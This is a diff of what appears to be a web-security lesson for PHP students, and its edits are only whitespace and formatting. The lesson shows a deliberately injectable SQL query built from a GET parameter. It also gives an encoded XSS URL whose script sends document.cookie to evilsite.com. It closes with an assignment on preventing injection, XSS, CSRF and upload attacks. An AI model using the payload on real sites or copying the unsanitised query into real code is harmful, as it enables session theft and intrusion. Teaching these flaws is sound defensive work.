@@ -40,7 +40,7 @@ password: password
 
 Test the previous code with Postman.
 
-Another example: 
+Another example:
 
 ```php
 <?php
@@ -48,9 +48,9 @@ Another example:
     error_reporting(E_ALL);
     global $DBH;
     require_once __DIR__ . '/../db/dbConnect.php';
-    
+
     $type = $_GET['type'];
-    
+
     $sql = "SELECT * FROM MediaItems WHERE media_type = '$type';";
     echo $sql;
     $STH = $DBH->query($sql);
@@ -94,7 +94,7 @@ echo $_GET['someparam'];
 
 Open this url to exploit the previous code:
 
-```
+```text
 http://localhost/folder/danger.php?someparam=%3Cscript%3E%28async%28%29%20%3D%3E%20await%20fetch%28%27http%3A%2F%2Fevilsite.com%2Fsteal.php%3Fcookie%3D%27%20%2B%20document.cookie%29%29%28%29%3C%2Fscript%3E
 ```
 
@@ -268,6 +268,3 @@ Secure the application from the previous assignments by implementing the followi
 2. Prevent XSS attacks by sanitizing user input before displaying it on the web page.
 3. Prevent CSRF attacks by using CSRF tokens in forms.
 4. Prevent file upload attacks by validating and sanitizing user input before moving the file to the server.
-
-
-
